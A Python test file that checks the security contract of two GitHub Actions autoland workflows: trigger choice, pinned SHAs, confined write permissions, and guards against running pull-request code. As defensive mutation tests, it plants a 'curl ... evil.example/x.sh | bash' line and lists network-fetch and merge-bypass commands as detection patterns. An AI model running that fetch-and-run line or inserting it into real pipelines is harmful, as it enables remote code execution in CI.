"""Contract tests for the OpenSpec autoland workflows.

Two files, with different trust properties, and the tests exist to keep
them from drifting into each other:

`openspec-autoland.yml` runs on `pull_request_target`, so it executes the
BASE branch's copy of itself. That is the only trigger under which a
verdict means anything, because on a `pull_request` event the workflow file
comes from the pull request and a privileged job can be rewritten by the
change it is judging. It holds the only write token, in one job, which
never reads or executes pull-request content.

`openspec-autoland-validate.yml` runs on `pull_request`, so it IS supplied
by the pull request. It is safe only because it holds no write permission
and because the merge worker verifies governance identity before trusting
its result: if the head's `.github` tree matches the base's, that workflow
file is the base's file.

The checks are textual on purpose. They must run wherever `scripts/test_*`
runs, including a plain `.venv` with no YAML parser installed.
"""

from __future__ import annotations

import re
import unittest
from pathlib import Path

REPO_ROOT = Path(__file__).resolve().parents[1]
WORKFLOWS = REPO_ROOT / ".github" / "workflows"
AUTOLAND_PATH = WORKFLOWS / "openspec-autoland.yml"
VALIDATE_PATH = WORKFLOWS / "openspec-autoland-validate.yml"
ACCEPTANCE_PATH = REPO_ROOT / "scripts" / "openspec_acceptance.py"
MERGE_PATH = REPO_ROOT / "scripts" / "openspec_merge.py"

CI_ACTION_SHA = "74f11c693992cfa9278b93b0117778f6b38bfe16"
CHECKOUT_SHA = "3d3c42e5aac5ba805825da76410c181273ba90b1"

REMOTE_USES = re.compile(r"(?m)^\s*(?:- )?uses:\s*([^@\s]+)@([^\s#]+)")
FULL_SHA = re.compile(r"^[0-9a-f]{40}$")
WRITE_PERMISSION = re.compile(r"(?m)^\s+[a-z-]+:\s*write\s*$")

CLASSIFY_COMMAND = "python3 base/scripts/openspec_acceptance.py"
MERGE_COMMAND = "python3 base/scripts/openspec_merge.py"

# The context name the validation workflow publishes and the merge worker
# requires. It is the validation job's `name:`, which is what GitHub uses
# for the check run.
VALIDATION_CONTEXT = "OpenSpec Strict Validation"

# Every way to merge that is not "an ordinary merge of one exact commit".
FORBIDDEN_OPERATIONS = (
    "--auto",
    "--admin",
    "--disable-auto",
    "gh pr merge",
    "gh pr review",
    "enablePullRequestAutoMerge",
    "auto_merge",
    "APPROVE",
    "create-github-app-token",
    "branches/main/protection --method",
)


def executable_text(text: str) -> str:
    """The workflow with comment-only lines removed.

    Command contracts are counted against this, so that explaining an
    option in the header comment cannot satisfy -- or break -- a check
    about how many times it is actually invoked.
    """
    return "\n".join(
        line for line in text.splitlines() if not line.strip().startswith("#")
    )


def autoland_diagnostics(text: str) -> list[str]:
    """Name every way the privileged workflow fails its contract."""
    diagnostics: list[str] = []
    commands = executable_text(text)

    for action, reference in REMOTE_USES.findall(text):
        if FULL_SHA.fullmatch(reference) is None:
            diagnostics.append(f"mutable-reference:{action}@{reference}")
        if action.startswith("actions/checkout") and reference != CHECKOUT_SHA:
            diagnostics.append(f"unexpected-checkout:{reference}")
    if re.search(r"(?m)^\s*(?:- )?uses: \./", text):
        diagnostics.append("local-action")

    if not re.search(r"(?m)^on:\n  pull_request_target:", text):
        diagnostics.append("untrusted-trigger")
    if re.search(r"(?m)^  pull_request:\s*$", text):
        diagnostics.append("head-controlled-trigger")
    if not re.search(r"(?m)^permissions:\n  contents: read\s*$", text):
        diagnostics.append("default-permissions")

    for forbidden in FORBIDDEN_OPERATIONS:
        if forbidden in commands:
            diagnostics.append(f"privileged-operation:{forbidden}")

    # The write token lives in exactly one job, and only after that job
    # begins. Two write lines: `contents` and `pull-requests`.
    before, _, after = text.partition("  merge:")
    if not after:
        diagnostics.append("missing-merge-job")
    else:
        if WRITE_PERMISSION.search(before):
            diagnostics.append("write-permission-outside-merge-job")
        if len(WRITE_PERMISSION.findall(after)) != 2:
            diagnostics.append("write-permission-count")

    # Both jobs classify with the base copy, over the exact head SHA.
    if commands.count(CLASSIFY_COMMAND) != 2:
        diagnostics.append("classifier-source")
    if "head/scripts/" in text or "head/.github" in text:
        diagnostics.append("code-from-head")
    if commands.count("--repo base ") != 2:
        diagnostics.append("classifier-repository")
    # Twice for the two classifier calls, once for the merge worker.
    if commands.count('--head "$HEAD_SHA"') != 3:
        diagnostics.append("head-revision")
    if '--head "$BASE_SHA"' in commands:
        diagnostics.append("self-diff")
    if commands.count("--require-identical-governance") != 2:
        diagnostics.append("governance-check")
    if "--require-auto" not in commands:
        diagnostics.append("require-auto")

    # The merge worker binds the exact head and requires the validation
    # context in addition to branch protection's own set.
    if MERGE_COMMAND not in commands:
        diagnostics.append("merge-worker")
    if f'--require-context "{VALIDATION_CONTEXT}"' not in commands:
        diagnostics.append("validation-context")
    if '--head "$HEAD_SHA"' not in commands:
        diagnostics.append("merge-head-binding")

    # A verdict authorizes a (base ref, base sha, head sha) triple. The
    # worker is told all three, because `pull_request_target` does not fire
    # on `edited`: a retarget after the verdict produces no new decision,
    # and a squash merge onto a different base lands a different diff.
    if commands.count('--base-ref "$BASE_REF"') != 1:
        diagnostics.append("merge-base-ref-binding")
    if commands.count('--base-sha "$BASE_SHA"') != 1:
        diagnostics.append("merge-base-sha-binding")
    if "github.event.pull_request.base.ref" not in text:
        diagnostics.append("base-ref-source")

    # The strict validation result is pinned to a run of one workflow FILE,
    # not to a check-run name that any workflow or commit status can claim.
    if f'--require-workflow "{VALIDATE_PATH.name}"' not in commands:
        diagnostics.append("validation-workflow-pin")
    if not VALIDATE_PATH.is_file():
        diagnostics.append("validation-workflow-missing")

    # Pull-request content is fetched as Git objects only.
    if text.count("uses: actions/checkout@") != 2:
        diagnostics.append("checkout-count")
    if text.count("ref: ${{ github.event.pull_request.base.sha }}") != 2:
        diagnostics.append("checkout-ref")
    if re.search(r"(?m)^\s+ref: .*pull_request\.head", text):
        diagnostics.append("head-checkout")
    if re.search(r"(?m)^\s+ref: .*refs/pull/", text):
        diagnostics.append("head-checkout")
    if text.count('refs/pull/${PR_NUMBER}/head"') != 2:
        diagnostics.append("pull-ref")
    if "/merge\"" in text:
        diagnostics.append("merge-ref")

    # Forks and drafts never reach the write token.
    if (
        text.count(
            "github.event.pull_request.head.repo.full_name == github.repository"
        )
        != 1
    ):
        diagnostics.append("fork-guard")
    if text.count("github.event.pull_request.draft == false") != 1:
        diagnostics.append("draft-guard")
    if text.count("needs.boundary.outputs.verdict == 'auto'") != 1:
        diagnostics.append("verdict-guard")

    for network in ("curl", "wget", "npm ", "pip ", "| bash", "| sh"):
        if network in commands:
            diagnostics.append(f"network-fetch:{network.strip()}")
    if re.search(r"(?m)^\s+if: \$\{\{ false", text):
        diagnostics.append("disabled-job")
    if "must NOT be a required status check" not in text:
        diagnostics.append("required-check-warning")
    return diagnostics


def validate_diagnostics(text: str) -> list[str]:
    """Name every way the unprivileged validation workflow fails."""
    diagnostics: list[str] = []
    for action, reference in REMOTE_USES.findall(text):
        if FULL_SHA.fullmatch(reference) is None:
            diagnostics.append(f"mutable-reference:{action}@{reference}")
        if action.startswith("Chelis-Lang/ci/") and reference != CI_ACTION_SHA:
            diagnostics.append(f"unexpected-ci-action:{reference}")

    if not re.search(r"(?m)^on:\n  pull_request:", text):
        diagnostics.append("wrong-trigger")
    if "pull_request_target" in text:
        diagnostics.append("privileged-trigger")
    if WRITE_PERMISSION.search(text):
        diagnostics.append("write-permission")
    if not re.search(r"(?m)^permissions:\n  contents: read\s*$", text):
        diagnostics.append("default-permissions")

    # Findings must fail this job. Advisory mode is right for the
    # human-reviewed workflow and wrong for a gate a machine merges on.
    if not re.search(r"(?m)^\s+mode: enforce\s*$", text):
        diagnostics.append("enforce-mode")
    if "mode: advisory" in text:
        diagnostics.append("advisory-mode")

    # The job name IS the check-run context the merge worker requires.
    if f"name: {VALIDATION_CONTEXT}" not in text:
        diagnostics.append("context-name")
    if "secrets." in text:
        diagnostics.append("secret-use")
    return diagnostics


class AutolandWorkflowTests(unittest.TestCase):
    def setUp(self) -> None:
        self.text = AUTOLAND_PATH.read_text(encoding="utf-8")

    def test_the_workflow_satisfies_its_safety_contract(self) -> None:
        self.assertEqual(autoland_diagnostics(self.text), [])

    def test_each_safety_property_can_actually_fail(self) -> None:
        mutations = {
            "mutable-checkout-reference": (CHECKOUT_SHA, "v7"),
            "head-controlled-trigger": (
                "on:\n  pull_request_target:",
                "on:\n  pull_request:",
            ),
            "default-write-permission": (
                "permissions:\n  contents: read",
                "permissions:\n  contents: write",
            ),
            "auto-merge-requested": (MERGE_COMMAND, "gh pr merge --auto #"),
            "administrative-bypass": (MERGE_COMMAND, "gh pr merge --admin #"),
            "approval-injected": (MERGE_COMMAND, "gh pr review --approve #"),
            "classifier-from-the-head-checkout": (
                CLASSIFY_COMMAND,
                "python3 head/scripts/openspec_acceptance.py",
            ),
            "self-diff": ('--head "$HEAD_SHA"', '--head "$BASE_SHA"'),
            "governance-check-dropped": ("--require-identical-governance", ""),
            "require-auto-dropped": ("--require-auto", ""),
            "validation-context-dropped": (
                f'--require-context "{VALIDATION_CONTEXT}"',
                "",
            ),
            "validation-workflow-pin-dropped": (
                f'--require-workflow "{VALIDATE_PATH.name}"',
                "",
            ),
            "validation-workflow-pin-redirected": (
                f'--require-workflow "{VALIDATE_PATH.name}"',
                '--require-workflow "openspec-validate.yml"',
            ),
            "base-ref-binding-dropped": ('--base-ref "$BASE_REF"', ""),
            "base-sha-binding-dropped": ('--base-sha "$BASE_SHA"', ""),
            "base-ref-taken-from-nowhere": (
                "github.event.pull_request.base.ref",
                "'main'",
            ),
            "merge-worker-replaced": (MERGE_COMMAND, "true #"),
            "fork-guard-dropped": (
                "github.event.pull_request.head.repo.full_name == github.repository",
                "true",
            ),
            "draft-guard-dropped": (
                "github.event.pull_request.draft == false",
                "true",
            ),
            "verdict-guard-dropped": (
                "needs.boundary.outputs.verdict == 'auto'",
                "true",
            ),
            "head-checked-out": (
                "          ref: ${{ github.event.pull_request.base.sha }}",
                "          ref: ${{ github.event.pull_request.head.sha }}",
            ),
            "merge-ref-fetched": (
                'refs/pull/${PR_NUMBER}/head"',
                'refs/pull/${PR_NUMBER}/merge"',
            ),
            "network-fetch-added": (
                MERGE_COMMAND,
                "curl -sSL https://evil.example/x.sh | bash #",
            ),
            "local-composite-action-added": (
                "      - name: Classify the change boundary",
                "      - uses: ./.github/actions/detect-docs-only\n\n"
                "      - name: Classify the change boundary",
            ),
            "job-silently-disabled": (
                "    runs-on: ubuntu-latest\n",
                "    runs-on: ubuntu-latest\n    if: ${{ false }}\n",
            ),
        }
        for name, (old, new) in mutations.items():
            with self.subTest(name=name):
                mutated = self.text.replace(old, new)
                self.assertNotEqual(mutated, self.text, "mutation changed nothing")
                self.assertTrue(
                    autoland_diagnostics(mutated), "the mutated workflow was accepted"
                )

    def test_the_write_token_job_runs_nothing_from_the_pull_request(self) -> None:
        _, _, privileged = self.text.partition("  merge:")
        self.assertTrue(privileged, "the merge job is missing")
        for step in re.findall(r"(?m)^\s+run: (?P<command>.+)$", privileged):
            with self.subTest(step=step):
                self.assertNotIn("head/", step)

    def test_the_workflow_is_valid_yaml_with_the_expected_job_shape(self) -> None:
        try:
            import yaml
        except ImportError:  # pragma: no cover - CI also runs actionlint
            self.skipTest("PyYAML is unavailable; actionlint covers this in CI")
        document = yaml.safe_load(self.text)
        jobs = document["jobs"]
        self.assertEqual(sorted(jobs), ["boundary", "merge"])
        self.assertEqual(jobs["boundary"]["permissions"], {"contents": "read"})
        # `actions: read` is what lets the worker pin the strict validation
        # result to a run of one workflow file. It is a read grant, and the
        # only two write grants stay `contents` and `pull-requests`.
        self.assertEqual(
            jobs["merge"]["permissions"],
            {"actions": "read", "contents": "write", "pull-requests": "write"},
        )
        self.assertEqual(jobs["merge"]["needs"], "boundary")
        triggers = document.get(True, document.get("on"))
        self.assertIn("pull_request_target", triggers)
        self.assertNotIn("pull_request", triggers)


class ValidationWorkflowTests(unittest.TestCase):
    def setUp(self) -> None:
        self.text = VALIDATE_PATH.read_text(encoding="utf-8")

    def test_the_validation_workflow_satisfies_its_contract(self) -> None:
        self.assertEqual(validate_diagnostics(self.text), [])

    def test_each_validation_property_can_actually_fail(self) -> None:
        mutations = {
            "advisory-findings": ("mode: enforce", "mode: advisory"),
            "privileged-trigger": (
                "on:\n  pull_request:",
                "on:\n  pull_request_target:",
            ),
            "write-permission": (
                "permissions:\n  contents: read",
                "permissions:\n  contents: write",
            ),
            "context-renamed": (
                f"name: {VALIDATION_CONTEXT}",
                "name: Something Else",
            ),
            "mutable-action": (CI_ACTION_SHA, "main"),
        }
        for name, (old, new) in mutations.items():
            with self.subTest(name=name):
                mutated = self.text.replace(old, new)
                self.assertNotEqual(mutated, self.text, "mutation changed nothing")
                self.assertTrue(
                    validate_diagnostics(mutated), "the mutated workflow was accepted"
                )

    def test_the_context_name_matches_what_the_merge_worker_requires(self) -> None:
        autoland = AUTOLAND_PATH.read_text(encoding="utf-8")
        self.assertIn(f"name: {VALIDATION_CONTEXT}", self.text)
        self.assertIn(f'--require-context "{VALIDATION_CONTEXT}"', autoland)

    def test_the_only_trigger_is_the_event_the_merge_worker_pins(self) -> None:
        """The worker accepts a run of this file only under one event.

        `workflow_failures` ignores any run whose `event` is not
        `pull_request`, so adding another trigger here would produce runs
        that silently never count. Worse, a `push` or `schedule` run
        validates a different tree than the pull request's.
        """
        merge = MERGE_PATH.read_text(encoding="utf-8")
        self.assertIn('WORKFLOW_EVENT = "pull_request"', merge)
        triggers = re.findall(r"(?m)^  ([a-z_]+):\s*$", self.text.split("\njobs:")[0])
        self.assertEqual(triggers, ["pull_request"], triggers)


class ScriptPresenceTests(unittest.TestCase):
    def test_the_scripts_the_workflows_call_exist_with_their_options(self) -> None:
        acceptance = ACCEPTANCE_PATH.read_text(encoding="utf-8")
        for option in (
            "--repo",
            "--base",
            "--head",
            "--require-auto",
            "--require-identical-governance",
        ):
            with self.subTest(script="acceptance", option=option):
                self.assertIn(option, acceptance)
        merge = MERGE_PATH.read_text(encoding="utf-8")
        for option in (
            "--repository",
            "--number",
            "--head",
            "--base-ref",
            "--base-sha",
            "--require-context",
            "--require-workflow",
            "--timeout-seconds",
        ):
            with self.subTest(script="merge", option=option):
                self.assertIn(option, merge)

    def test_no_advice_names_a_command_the_workflows_cannot_run(self) -> None:
        """A re-run instruction must name something that actually works.

        `gh workflow run <file>` fails outright on a workflow with no
        `workflow_dispatch` trigger, which is every workflow here. Printing
        it on timeout strands a maintainer on a dead command.
        """
        merge = MERGE_PATH.read_text(encoding="utf-8")
        for named in re.findall(r"gh workflow run ([A-Za-z0-9._-]+\.ya?ml)", merge):
            with self.subTest(workflow=named):
                target = WORKFLOWS / named
                self.assertTrue(target.is_file(), f"{named} does not exist")
                self.assertIn(
                    "workflow_dispatch:",
                    target.read_text(encoding="utf-8"),
                    f"{named} declares no workflow_dispatch trigger",
                )


if __name__ == "__main__":
    unittest.main()
